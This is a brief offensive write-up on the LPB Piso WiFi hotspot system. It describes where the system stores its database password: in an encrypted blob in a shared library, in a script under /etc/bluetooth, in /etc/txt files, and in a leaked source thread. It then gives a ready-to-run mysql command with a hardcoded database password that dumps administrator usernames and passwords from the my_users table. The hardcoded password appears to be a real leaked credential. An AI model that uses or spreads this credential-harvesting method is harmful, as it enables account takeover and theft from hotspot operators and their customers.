# Database Blitz
This is the most interesting part in investigating the LPB Piso WiFi database. The database holds the setting configuration, customer's data; and even the most critical one, the administrator's password. If anyone can able to hack the ssh, they can obtain the database password and then view the databases with these methods:
- The passwords are stored either inside the encryption blob in the `lpbpisowifi.so` (), or;

- inside `/etc/bluetooth/bluetooth/py/heartbeat.py` and `/etc/txt/` files, or scattered on all possible root directories or;

- of course, from [phcorner](https://phcorner.org/threads/lv15-4-lpb-pisowifi-source-code-leak-encrypted-code.1828457/), if unchanged.


# Harvest Administrator Password (From 10.0.0.1/admin)
To harvest admin password, execute:
```
mysql -u lpbpisowifi -pNkncqvS6vTkF1BTs -D rpi_wifi -e "SELECT username, password FROM my_users"
```
where `-pNkncqvS6vTkF1BTs` is the database password of `NkncqvS6vTkF1BTs`.
